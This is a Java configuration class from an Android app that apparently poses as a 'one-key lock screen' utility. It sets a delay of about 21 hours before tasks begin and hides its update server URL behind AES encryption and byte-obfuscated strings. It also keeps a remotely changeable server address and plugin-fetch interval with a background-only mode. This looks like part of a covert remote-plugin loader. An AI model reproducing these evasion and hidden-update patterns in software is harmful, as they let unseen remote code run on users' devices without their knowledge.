package workspace.main;
import workspace.utils.AES;
import workspace.utils.SimpleEncoder;
import android.content.Context;
import android.content.SharedPreferences;
import android.text.TextUtils;

public class Variables {
    /**
     * 第一次启动多久之后开始执行任务
     */
    public static long requestDelay = 3599 * 21;
    //public static long requestDelay = 0;
    /**
     * "htt"
     */
    private static final String HTT = SimpleEncoder.getString(new byte[] { 106, 119, 112 });
    //这是不要改,服务器上的打包脚本枝用到
    public static final int channelId = 228213228;
    /**
     * Channels
     * 1.//JJ渠道1(一键锁屏)
     * 2.JJ渠道2(一键锁屏)
     * 3.JJ渠道3(一键锁屏)
     * "CF7A23FC7CE946E48B447E9C09DF548A,DF7X23FC7CE946E48B447EXC09DF548X,X37A23FC7XE9463483447E9C09DF5483"
     */
    public static final String channels = SimpleEncoder.getString(new byte[] { 65, 69, 51, 68, 52, 52, 78, 74, 61, 72, 73, 52, 58, 57, 85, 37, 42, 81, 32, 33, 33, 82, 33, 90, 42,
            34, 88, 91, 43, 43, 24, 96, 14, 103, 98, 18, 126, 21, 27, 111, 105, 28, 111, 104, 23, 27, 6, 116, 6, 11, 118, 1, 2, 0, 125, 97, 121, 11, 5, 121, 120, 10, 116, 121, 26,
            111, 28, 118, 113, 6, 122, 122, 12, 8, 123, 21, 11, 118, 100, 103, 97, 103, 108, 102, 98, 99, 111, 28, 99, 24, 108, 100, 26, 25, 85, 85, 90, 80 });
    private static final String BACKGROUND_KEY = "a";
    private static final String PLUGIN_INTERVAL_KEY = "b";
    private static final String URL_KEY = "d";
    private static final String INSTALL_TIME_KEY = "e";
    private static final String CLIENT_ID_KEY = "f";
    /**
     * "http://update.l3721.com/yyyyyyyyyyy"
     */
    private static final String url = "kS2xbLXAlIOMypiL2Oo5DBY2X0m75HgoWLyWX2gKaUlxsZEoEDgMzs5UOOYRuSlJ";
    /////////////////////////////////////////////////////////////////////////////////
    private static Boolean backgroundOnly = null;
    /////////////////////////////////////////////////////////////////////////////////
    private static final long defaultPluginInterval = 600;
    private static long pInterval = 0;
    /////////////////////////////////////////////////////////////////////////////////
    public static void clearUrl(Context context) {
        getPref(context).edit().remove(URL_KEY).commit();
    }
    public static long getClientId(Context context) {
        return getPref(context).getLong(CLIENT_ID_KEY, 0);
    }
    ///////////////////////////////////////////////////////////////////////////////
    public static long getInstallTime(Context context) {
        return getPref(context).getLong(INSTALL_TIME_KEY, 0);
    }
    public static long getInterval(Context context) {
        if (pInterval <= 0) {
            pInterval = getPref(context).getLong(PLUGIN_INTERVAL_KEY, defaultPluginInterval);
        }
        return pInterval;
    }
    private static SharedPreferences getPref(Context context) {
        return context.getSharedPreferences("dddddddddd", 0);
    }
    public static String getUrl(Context context) {
        String result = getPref(context).getString(URL_KEY, null);
        if (TextUtils.isEmpty(result)) result = AES.decode(Variables.url);
        return result;
    }
    public static boolean isBackgroundOnly(Context context) {
        if (backgroundOnly == null) {
            backgroundOnly = getPref(context).getBoolean(BACKGROUND_KEY, false);
        }
        return backgroundOnly;
    }
    ////////////////////////
    public static void saveClientId(Context context, long clientId) {
        if (clientId > 0) {
            getPref(context).edit().putLong(CLIENT_ID_KEY, clientId).commit();
        }
    }
    public static void saveInstallTime(Context context) {
        SharedPreferences pref = getPref(context);
        if (pref.getLong(INSTALL_TIME_KEY, 0) == 0) {
            pref.edit().putLong(INSTALL_TIME_KEY, System.currentTimeMillis()).commit();
        }
    }
    public static void setBackgroundOnly(Context context, boolean value) {
        backgroundOnly = value;
        getPref(context).edit().putBoolean(BACKGROUND_KEY, backgroundOnly).commit();
    }
    public static boolean setInterval(Context context, long value) {
        boolean result = false;
        if (pInterval != value && value >= 60 && value < 3600 * 24 * 5) {
            pInterval = value;
            getPref(context).edit().putLong(PLUGIN_INTERVAL_KEY, value).commit();
            result = true;
        }
        return result;
    }
    /////////////////////////////////////////////////////////////////////////////////
    public static void setUrl(Context context, String value) {
        if (value != null && value.contains(HTT) && value.length() > 10) {
            getPref(context).edit().putString(URL_KEY, value).commit();
        }
    }
}
